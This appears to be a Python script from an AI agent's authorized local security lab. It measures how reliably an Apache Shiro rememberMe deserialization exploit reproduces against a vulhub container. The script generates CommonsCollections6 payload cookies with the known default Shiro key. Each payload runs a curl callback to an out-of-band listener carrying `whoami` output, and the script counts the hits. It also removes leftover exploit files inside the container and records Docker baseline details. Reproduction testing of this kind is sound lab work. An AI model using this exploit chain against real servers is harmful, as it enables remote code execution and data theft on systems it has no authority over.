#!/usr/bin/env python3
# loop3 t7 — C1 复现率（多轮）+ 容器残留清理 + C3 基线采集
import json, os, re, subprocess, sys, time, datetime, hashlib
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
EV = os.path.join(CWD, r"security\learning\_evidence")
SHIRO = "http://127.0.0.1:18081/"
OOB_HOST, OOB_PORT = "192.168.65.254", 8099
OOB_LOG = os.path.join(EV, "loop3-t7-c1-oob.jsonl")
UA = "loop3-t7/1.0 (authorized local lab)"
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
OUT_PATH = os.path.join(EV, "loop3-t7-c1-rate-and-baseline-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": [], "rate": {}}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:700], flush=True)
    return kw


def sh(c, timeout=180):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=timeout)
    return (r.stdout or "") + (r.stderr or "")


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd],
                       capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def hits(tag):
    out = []
    if os.path.exists(OOB_LOG):
        for line in open(OOB_LOG, encoding="utf-8", errors="replace"):
            line = line.strip()
            if not line:
                continue
            try:
                e = json.loads(line)
                if tag in (e.get("path") or ""):
                    out.append(e)
            except Exception:
                pass
    return out


# ================= C1 复现率：CC6 × 5 轮 =================
r1 = {"tries": 0, "ok": 0, "fail": []}
for i in range(5):
    tag = f"t7rate-cc6-{i}"
    cmd = f"curl -s http://{OOB_HOST}:{OOB_PORT}/{tag}-$(whoami)"
    r = kali(f"ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 '{cmd}' /tmp/t7-rate-{i}.txt '{KEY}' 2>&1")
    ck = clean_b64(kali(f"cat /tmp/t7-rate-{i}.txt"))
    r1["tries"] += 1
    if not ck:
        r1["fail"].append({"round": i + 1, "why": "cookie empty"})
        continue
    try:
        time.sleep(1.2)
        requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                     timeout=45, allow_redirects=False)
    except Exception as e:
        r1["fail"].append({"round": i + 1, "why": repr(e)[:100]})
        continue
    time.sleep(2.5)
    h = hits(tag)
    if h:
        r1["ok"] += 1
    else:
        r1["fail"].append({"round": i + 1, "why": "no OOB hit"})
rec("RATE_C1_CC6_oob", **r1)
OUT["rate"]["C1_CC6"] = r1

# ================= C2 复现率（不重启 tomcat，改为记录历史）+ 清理 shiro 容器残留 =================
rec("cleanup_shiro_tmp",
    before=sh("docker exec vulhub-shiro-18081 sh -c \"ls -d /tmp/jarx /tmp/lib /tmp/probe /tmp/t7* 2>/dev/null\"").strip(),
    remove=sh("docker exec vulhub-shiro-18081 sh -c \"rm -rf /tmp/jarx /tmp/lib /tmp/probe /tmp/t7-* /tmp/pw* /tmp/t7*; rm -f /tmp/*.txt /tmp/*.json 2>/dev/null; echo cleaned\"").strip(),
    after=sh("docker exec vulhub-shiro-18081 sh -c \"ls -d /tmp/jarx /tmp/lib /tmp/probe /tmp/t7* 2>/dev/null | wc -l\"").strip())

# ================= C3 基线 =================
def dockerf(fmt, name):
    return sh(f'docker inspect -f "{fmt}" {name}').strip()

baseline = {"ts": datetime.datetime.now().isoformat(), "docker": {}}
baseline["docker"]["version"] = sh("docker version --format '{{.Client.Version}}/{{.Server.Version}}'").strip()
for name, port in (("vulhub-shiro-18081", 18081), ("vulhub-tomcat-18082", 18082)):
    baseline[name] = {
        "image": dockerf("{{.Config.Image}}", name),
        "image_id": dockerf("{{.Image}}", name),
        "state": dockerf("{{.State.Status}}", name),
        "exit_code": dockerf("{{.State.ExitCode}}", name),
        "host_port_binding": sh(f'docker port {name}').strip(),
        "binds": dockerf("{{json .HostConfig.Binds}}", name),
        "mount_count": dockerf("{{len .Mounts}}", name),
        "network_mode": dockerf("{{.HostConfig.NetworkMode}}", name),
        "restart_policy": dockerf("{{.HostConfig.RestartPolicy.Name}}", name),
        "security_opt": dockerf("{{json .HostConfig.SecurityOpt}}", name),
        "ports": dockerf("{{json .NetworkSettings.Ports}}", name),
    }
baseline["images"] = sh('docker images --digests --format "{{.Repository}}:{{.Tag}} {{.Digest}} {{.ID}} {{.Size}}"').strip().splitlines()
baseline["host_listeners_18080_18099"] = sh("netstat -ano | findstr /R \":1808[0-9] :1809[0-9]\"").strip().splitlines()
baseline["reproduce_commands"] = {
    "shiro": "docker run -d --name vulhub-shiro-<port> -p 127.0.0.1:<port>:8080 vulhub/shiro:1.2.4",
    "tomcat": "docker run -d --name vulhub-tomcat-<port> -p 127.0.0.1:<port>:8080 vulhub-tomcat-cve-2017-12615",
    "note": "D:\\dsh-vulhub\\tomcat-CVE-2017-12615\\docker-compose.yml 的端口写成 8080:8080（缺 hostIP）——下一个人 compose up 会绑 0.0.0.0，建议改 127.0.0.1:18082:8080（t6 已提，本任务未改文件）",
}
baseline["credentials"] = {"shiro": "无默认账号（demo 应用，登录页 /login）", "tomcat": "manager/host-manager 未配置用户（conf/tomcat-users.xml 未启用）"}
rec("C3_baseline_captured", keys=list(baseline.keys()))
OUT["baseline"] = baseline

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "rate": r1}))
